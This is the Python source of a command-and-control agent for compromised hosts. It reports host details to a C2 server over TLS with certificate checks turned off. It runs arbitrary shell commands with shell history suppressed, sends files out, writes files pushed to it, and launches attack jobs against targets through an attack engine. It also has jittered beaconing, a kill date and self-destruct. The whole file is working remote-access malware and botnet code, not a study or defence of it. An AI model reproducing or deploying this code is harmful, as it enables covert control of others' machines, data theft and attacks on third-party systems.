#!/usr/bin/env python3
"""
C2 Client / Agent
Deployed agent for compromised hosts
"""

import socket
import ssl
import time
import os
import sys
import platform
import subprocess
import threading
import json
import struct
import uuid
from typing import Dict, Optional, Callable
from pathlib import Path
from dataclasses import dataclass, field

from .encryption import C2Encryption, KeyPair
from .protocol import (
    C2Message, MessageType, ProtocolEncoder, FragmentReassembler,
    MessageFlags, CommandBuilder
)


@dataclass
class AgentConfig:
    """Agent configuration"""
    server_host: str = '127.0.0.1'
    server_port: int = 8443
    use_ssl: bool = True
    reconnect_interval: float = 30.0
    heartbeat_interval: float = 60.0
    jitter_max: float = 10.0
    kill_date: Optional[float] = None
    working_directory: str = '/tmp'
    debug: bool = False


@dataclass
class AgentInfo:
    """Agent system information"""
    agent_id: str = field(default_factory=lambda: uuid.uuid4().hex)
    hostname: str = ''
    os_name: str = ''
    os_version: str = ''
    arch: str = ''
    username: str = ''
    pid: int = 0
    ip_address: str = ''
    python_version: str = ''
    privileges: str = ''
    
    def collect(self) -> None:
        """Collect system information"""
        self.hostname = platform.node()
        self.os_name = platform.system()
        self.os_version = platform.version()
        self.arch = platform.machine()
        self.username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
        self.pid = os.getpid()
        self.python_version = platform.python_version()
        
        try:
            self.privileges = 'root' if os.geteuid() == 0 else 'user'
        except Exception:
            self.privileges = 'unknown'
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            self.ip_address = s.getsockname()[0]
            s.close()
        except Exception:
            self.ip_address = 'unknown'
    
    def to_dict(self) -> Dict:
        return {
            'agent_id': self.agent_id,
            'hostname': self.hostname,
            'os': self.os_name,
            'os_version': self.os_version,
            'arch': self.arch,
            'user': self.username,
            'pid': self.pid,
            'ip': self.ip_address,
            'python': self.python_version,
            'privileges': self.privileges,
        }


class C2Client:
    """C2 agent client"""
    
    def __init__(self, config: AgentConfig = None):
        self.config = config or AgentConfig()
        self.info = AgentInfo()
        self.info.collect()
        
        self._encryption = C2Encryption()
        self._reassembler = FragmentReassembler()
        self._socket: Optional[socket.socket] = None
        self._connected = False
        self._running = False
        self._stop_event = threading.Event()
        
        self._active_attacks: Dict[str, threading.Event] = {}
        self._command_handlers: Dict[str, Callable] = {}
        self._on_connect_callbacks: list = []
        self._on_disconnect_callbacks: list = []
        
        self._register_default_handlers()
    
    def _register_default_handlers(self) -> None:
        """Register default command handlers"""
        self._command_handlers['shell'] = self._handle_shell
        self._command_handlers['download'] = self._handle_download
        self._command_handlers['upload'] = self._handle_upload
        self._command_handlers['system_info'] = self._handle_system_info
        self._command_handlers['attack_start'] = self._handle_attack_start
        self._command_handlers['attack_stop'] = self._handle_attack_stop
    
    def on_connect(self, callback: Callable) -> None:
        self._on_connect_callbacks.append(callback)
    
    def on_disconnect(self, callback: Callable) -> None:
        self._on_disconnect_callbacks.append(callback)
    
    def register_handler(self, name: str, handler: Callable) -> None:
        self._command_handlers[name] = handler
    
    def _connect(self) -> bool:
        """Establish connection to C2 server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.reconnect_interval)
            sock.connect((self.config.server_host, self.config.server_port))
            
            if self.config.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.config.server_host)
            
            self._socket = sock
            self._connected = True
            
            # Key exchange
            self._do_handshake()
            
            # Send system info
            self._send_system_info()
            
            # Fire callbacks
            for cb in self._on_connect_callbacks:
                try:
                    cb(self)
                except Exception:
                    pass
            
            return True
        except Exception as e:
            if self.config.debug:
                print(f"[DEBUG] Connection failed: {e}")
            self._connected = False
            return False
    
    def _do_handshake(self) -> None:
        """Perform encryption handshake"""
        # Receive server public key
        data = self._recv_exact(4)
        if not data:
            raise ConnectionError("Failed to receive server pubkey length")
        pubkey_len = struct.unpack('!I', data)[0]
        
        server_pub_pem = self._recv_exact(pubkey_len)
        if not server_pub_pem:
            raise ConnectionError("Failed to receive server pubkey")
        
        # Send our public key
        client_kp = KeyPair()
        client_pub = client_kp.get_public_pem()
        self._socket.sendall(struct.pack('!I', len(client_pub)) + client_pub)
        
        # Receive key exchange response
        data = self._recv_exact(4)
        resp_len = struct.unpack('!I', data)[0]
        response = self._recv_exact(resp_len)
        
        # Complete handshake
        self._encryption.client_handshake(server_pub_pem, response)
    
    def _send_system_info(self) -> None:
        """Send agent info to server"""
        msg = C2Message(
            msg_type=MessageType.SYSTEM_INFO,
            metadata=self.info.to_dict()
        )
        self._send(msg)
    
    def _send(self, message: C2Message) -> bool:
        """Send encrypted message"""
        if not self._connected or not self._encryption.is_established:
            return False
        
        try:
            frame = ProtocolEncoder.encode(message)
            encrypted = self._encryption.encrypt_message(frame)
            
            # Length prefix
            self._socket.sendall(struct.pack('!I', len(encrypted)) + encrypted)
            return True
        except Exception:
            self._connected = False
            return False
    
    def _recv(self) -> Optional[C2Message]:
        """Receive and decrypt message"""
        if not self._connected:
            return None
        
        try:
            # Read length
            length_data = self._recv_exact(4)
            if not length_data:
                return None
            length = struct.unpack('!I', length_data)[0]
            
            if length > 16 * 1024 * 1024:
                return None
            
            # Read encrypted data
            encrypted = self._recv_exact(length)
            if not encrypted:
                return None
            
            # Decrypt
            frame = self._encryption.decrypt_message(encrypted)
            
            # Decode
            message = ProtocolEncoder.decode(frame)
            if not message:
                return None
            
            # Reassemble if fragmented
            return self._reassembler.add(message)
        except Exception:
            self._connected = False
            return None
    
    def _recv_exact(self, n: int) -> Optional[bytes]:
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            try:
                chunk = self._socket.recv(n - len(data))
                if not chunk:
                    return None
                data += chunk
            except Exception:
                return None
        return data
    
    def _handle_message(self, message: C2Message) -> None:
        """Route incoming message to handler"""
        if message.msg_type == MessageType.PING:
            self._send(C2Message(msg_type=MessageType.PONG))
            return
        
        if message.msg_type == MessageType.ATTACK_START:
            handler = self._command_handlers.get('attack_start')
            if handler:
                result = handler(message.metadata)
                if result:
                    self._send(result)
            return
        
        if message.msg_type == MessageType.ATTACK_STOP:
            handler = self._command_handlers.get('attack_stop')
            if handler:
                handler(message.metadata)
            return
        
        if message.msg_type == MessageType.SHELL_COMMAND:
            handler = self._command_handlers.get('shell')
            if handler:
                result = handler(message.metadata)
                self._send(result)
            return
        
        if message.msg_type == MessageType.DATA_DOWNLOAD:
            handler = self._command_handlers.get('download')
            if handler:
                result = handler(message.metadata)
                self._send(result)
            return
        
        if message.msg_type == MessageType.DATA_UPLOAD:
            handler = self._command_handlers.get('upload')
            if handler:
                handler(message.metadata, message.payload)
            return
        
        if message.msg_type == MessageType.SYSTEM_INFO:
            handler = self._command_handlers.get('system_info')
            if handler:
                result = handler(message.metadata)
                self._send(result)
            return
        
        if message.msg_type == MessageType.SELF_DESTRUCT:
            delay = message.metadata.get('delay', 0)
            if delay > 0:
                threading.Timer(delay, os._exit, args=[0]).start()
            else:
                os._exit(0)
    
    def _handle_shell(self, meta: Dict) -> C2Message:
        """Execute shell command"""
        cmd = meta.get('command', '')
        timeout = meta.get('timeout', 30)
        
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, timeout=timeout,
                text=True, env={**os.environ, 'HISTFILE': '/dev/null'}
            )
            output = result.stdout + result.stderr
            return C2Message(
                msg_type=MessageType.SHELL_OUTPUT,
                metadata={'exit_code': result.returncode},
                payload=output.encode('utf-8', errors='replace')[:65535]
            )
        except subprocess.TimeoutExpired:
            return C2Message(
                msg_type=MessageType.COMMAND_ERROR,
                metadata={'error': 'Command timed out'}
            )
        except Exception as e:
            return C2Message(
                msg_type=MessageType.COMMAND_ERROR,
                metadata={'error': str(e)}
            )
    
    def _handle_download(self, meta: Dict) -> C2Message:
        """Read file and send"""
        path = meta.get('path', '')
        try:
            with open(path, 'rb') as f:
                data = f.read()
            return C2Message(
                msg_type=MessageType.DATA_UPLOAD,
                metadata={'path': path, 'size': len(data)},
                payload=data[:16 * 1024 * 1024]  # Max 16MB
            )
        except Exception as e:
            return C2Message(
                msg_type=MessageType.COMMAND_ERROR,
                metadata={'error': str(e)}
            )
    
    def _handle_upload(self, meta: Dict, payload: bytes) -> None:
        """Write received file"""
        path = meta.get('path', '')
        try:
            path_obj = Path(path)
            path_obj.parent.mkdir(parents=True, exist_ok=True)
            with open(path, 'wb') as f:
                f.write(payload)
        except Exception:
            pass
    
    def _handle_system_info(self, meta: Dict) -> C2Message:
        """Return updated system info"""
        self.info.collect()
        return C2Message(
            msg_type=MessageType.SYSTEM_INFO,
            metadata=self.info.to_dict()
        )
    
    def _handle_attack_start(self, meta: Dict) -> Optional[C2Message]:
        """Start attack on this agent"""
        job_id = meta.get('job_id', uuid.uuid4().hex[:8])
        stop_event = threading.Event()
        self._active_attacks[job_id] = stop_event
        
        def _run_attack():
            try:
                from ironcarrier.core import Engine, AttackJob
                engine = Engine()
                job = AttackJob(
                    target=meta['target'],
                    port=meta['port'],
                    vector=meta['vector'],
                    duration=meta['duration'],
                    threads=meta.get('threads', 100),
                    options=meta.get('options', {})
                )
                job.job_id = job_id
                engine.launch(job)
            except Exception as e:
                pass
            finally:
                self._active_attacks.pop(job_id, None)
        
        t = threading.Thread(target=_run_attack, daemon=True)
        t.start()
        
        return C2Message(
            msg_type=MessageType.ATTACK_STATUS,
            metadata={'job_id': job_id, 'status': 'started'}
        )
    
    def _handle_attack_stop(self, meta: Dict) -> None:
        """Stop attack"""
        job_id = meta.get('job_id', '')
        stop_event = self._active_attacks.get(job_id)
        if stop_event:
            stop_event.set()
    
    def _heartbeat_loop(self) -> None:
        """Send periodic heartbeats"""
        while self._running and not self._stop_event.is_set():
            if self._connected:
                self._send(C2Message(msg_type=MessageType.HEARTBEAT))
            
            jitter = __import__('random').uniform(0, self.config.jitter_max)
            self._stop_event.wait(self.config.heartbeat_interval + jitter)
    
    def _command_loop(self) -> None:
        """Main receive loop"""
        while self._running and not self._stop_event.is_set():
            if not self._connected:
                if not self._connect():
                    jitter = __import__('random').uniform(0, self.config.jitter_max)
                    self._stop_event.wait(self.config.reconnect_interval + jitter)
                    continue
            
            # Check kill date
            if self.config.kill_date and time.time() > self.config.kill_date:
                os._exit(0)
            
            message = self._recv()
            if message:
                self._handle_message(message)
            else:
                self._connected = False
                for cb in self._on_disconnect_callbacks:
                    try:
                        cb(self)
                    except Exception:
                        pass
            
            # Cleanup old fragments
            self._reassembler.cleanup()
    
    def start(self) -> None:
        """Start the agent"""
        self._running = True
        self._stop_event.clear()
        
        # Change working directory
        try:
            os.chdir(self.config.working_directory)
        except Exception:
            pass
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Enter command loop
        try:
            self._command_loop()
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
    
    def stop(self) -> None:
        """Stop the agent"""
        self._running = False
        self._stop_event.set()
        
        if self._connected:
            try:
                self._send(C2Message(msg_type=MessageType.DISCONNECT))
            except Exception:
                pass
        
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
        
        self._connected = False
